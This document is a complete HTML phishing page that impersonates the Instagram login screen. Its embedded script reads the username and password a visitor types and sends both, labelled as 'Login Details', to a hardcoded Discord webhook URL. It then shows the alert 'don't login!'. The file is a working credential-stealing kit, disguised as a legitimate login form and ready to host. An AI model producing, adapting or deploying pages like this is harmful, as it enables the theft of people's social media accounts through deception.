<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram login </title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-color: #fafafa;
            font-family: Arial, sans-serif;
        }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen py-10">
    <div class="w-full max-w-sm p-10 bg-white border border-gray-300 rounded-lg shadow-md">
        <div class="text-center text-4xl font-bold mb-6 font-sans tracking-wide">Instagram</div>
        <form id="loginForm" action="#" method="POST" class="space-y-4">
            <div>
                <input type="text" name="username" id="username" placeholder="Phone number, username, or email" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-gray-400 bg-gray-50 text-sm">
            </div>
            <div>
                <input type="password" name="password" id="password" placeholder="Password" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-gray-400 bg-gray-50 text-sm">
            </div>
            <button type="submit" class="w-full py-2 bg-blue-500 text-white font-semibold rounded-md hover:bg-blue-600 text-sm">Log in</button>
            <div class="flex items-center justify-center mt-4 text-gray-500 text-xs">
                <span class="w-1/3 border-b border-gray-300"></span>
                <span class="mx-2">OR</span>
                <span class="w-1/3 border-b border-gray-300"></span>
            </div>
            <div class="flex items-center justify-center mt-2">
                <button type="button" class="w-full flex items-center justify-center py-2 text-blue-900 font-semibold text-sm">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="w-4 mr-2">
                    Log in with Facebook
                </button>
            </div>
            <div class="mt-4 text-center">
                <a href="#" class="text-xs text-blue-500">Forgot password?</a>
            </div>
        </form>
    </div>
    <div class="mt-4 text-center text-xs border border-gray-300 bg-white p-4 w-full max-w-sm">
        Don't have an account? <a href="#" class="text-blue-500 font-semibold">Sign up</a>
    </div>
    <div class="mt-4 text-center">
        <p class="text-xs">Get the app.</p>
        <div class="flex justify-center space-x-2 mt-2">
            <img src="https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png" alt="Google Play" class="w-32">
            <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="App Store" class="w-28">
        </div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const webhookURL = "https://discordapp.com/api/webhooks/1341453845758480466/9Yr6E7tX7C48SsBj7U1VwesPFlQEszXlImieOoWLBCM6M5RcIqXCNZlqVPgpnHIkq2Ob";
            
            if (username && password) {
                const payload = {
                    content: `New Login Attempt`,
                    embeds: [{
                        title: "Login Details",
                        fields: [
                            { name: "Username", value: username, inline: true },
                            { name: "Password", value: password, inline: true }
                        ],
                        color: 3447003
                    }]
                };
                
                fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                }).then(response => {
                    if (response.ok) {
                        alert("don't login!");
                    } else {
                        alert("Error sending data.");
                    }
                }).catch(error => {
                    alert("Error: " + error);
                });
            }
        });
    </script>
</body>
</html>
